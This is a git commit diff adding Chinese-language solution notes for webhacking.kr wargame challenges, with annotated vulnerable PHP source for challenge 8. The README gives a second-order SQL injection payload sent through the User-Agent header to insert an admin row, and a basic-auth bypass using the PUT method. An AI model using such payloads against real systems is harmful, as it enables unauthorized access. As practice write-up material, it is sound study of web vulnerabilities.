009c5a39be46ab0802217ac7eac5e682fcd42df7
JesseMK <Jessewangzh@hotmail.com>
2016-06-29 17:20:54 +0800

    web_08 solved

--- WebHacking.kr/README.md
+++ WebHacking.kr/README.md
@@ -1,17 +1,34 @@
 # WebHacking
 
-- Online Link: [WebHacking](http://webhacking.kr/challenge/)
+-   Online Link: [WebHacking](http://webhacking.kr/challenge/)
 
 ## web-01
 
 ## web-02
-- 检查`index.php`源码，发现`<area shape="rect" coords="851,7,890,65" href="admin/" target="" alt="" />·`
-- 访问`/admin`，需要login
+
+-   检查`index.php`源码，发现`<area shape="rect" coords="851,7,890,65" href="admin/" target="" alt="" />·`
+-   访问`/admin`，需要login
 
 ## web-03
-- `http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111`
+
+-   `http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111`
 
     > 管理页面
     > 注意事项
-    > -要小心，不要管理员密码被泄露。
-    > -请参考您正在使用它的第一次手动分钟。（手动密码：@ dM1n__nnanual）
+    > 要小心，不要管理员密码被泄露。
+    > 请参考您正在使用它的第一次手动分钟。（手动密码：@ dM1n\_\_nnanual）
+
+## web-08
+
+-   二次注入，需要掌握整个流程
+    -   [源码分析](./web_08/index.php)
+    -   注入点 `$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");`
+    -   此处 agent 是可控的，而且没有针对 ''', ',', '#' 进行防护
+-   第一次：`admin','1','admin')#` -> `USER-AGENT done! (0/70)`
+-   第二次：`admin` -> `USER-AGENT hi admin`
+
+## web-09
+
+-   Basic access authentication(HTTP 基本认证)
+    -   本题针对 GET 以及 POST 方法进行了基本认证，而忽略了PUT方法，由此绕过
+-
--- WebHacking.kr/web_08/index.php
+++ WebHacking.kr/web_08/index.php
@@ -1,23 +1,14 @@
-<html>
-<head>
-<title>Challenge 8</title>
-<style type="text/css">
-body { background:black; color:white; font-size:10pt; }
-</style>
-</head>
-<body>
-<br><br>
-<center>USER-AGENT
-
 <?php
 
 $agent=getenv("HTTP_USER_AGENT");
 $ip=$_SERVER[REMOTE_ADDR];
 
 $agent=trim($agent);
+// trim — Strip whitespace (or other characters) from the beginning and end of a string
 
 $agent=str_replace(".", "_", $agent);
 $agent=str_replace("/", "_", $agent);
+// replace . & /
 
 $pat="/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/";
 
@@ -26,19 +17,23 @@ $agent=strtolower($agent);
 if (preg_match($pat, $agent)) {
     exit("Access Denied!");
 }
+// 注入检测，需要注意关键的'\'', ',', '#'没有被检测
 
 $_SERVER[HTTP_USER_AGENT]=str_replace("'", "", $_SERVER[HTTP_USER_AGENT]);
 $_SERVER[HTTP_USER_AGENT]=str_replace("\"", "", $_SERVER[HTTP_USER_AGENT]);
+// 替换掉了 ' 和 "
 
 $count_ck=@mysql_fetch_array(mysql_query("select count(id) from lv0"));
 if ($count_ck[0]>=70) {
     @mysql_query("delete from lv0");
 }
-
+// 循环计数
 
 $q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");
+// 从数据库中找出当前 agent 的 id
 
 $ck=@mysql_fetch_array($q);
+// 找出该 id 的记录
 
 if ($ck) {
     echo("hi <b>$ck[0]</b><p>");
@@ -47,20 +42,11 @@ if ($ck) {
         @mysql_query("delete from lv0");
     }
 }
+// 如果查询成功且为 admin 则解决
 
 if (!$ck) {
     $q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
     echo("<br><br>done!  ($count_ck[0]/70)");
 }
-
-
-?>
-
-<!--
-
-index.phps
-
--->
-
-</body>
-</html>
+// 如果查询失败则插入权限为 guest 的记录
+// 此处 agent 是可控的，而且没有针对 ''', ',', '#' 进行防护
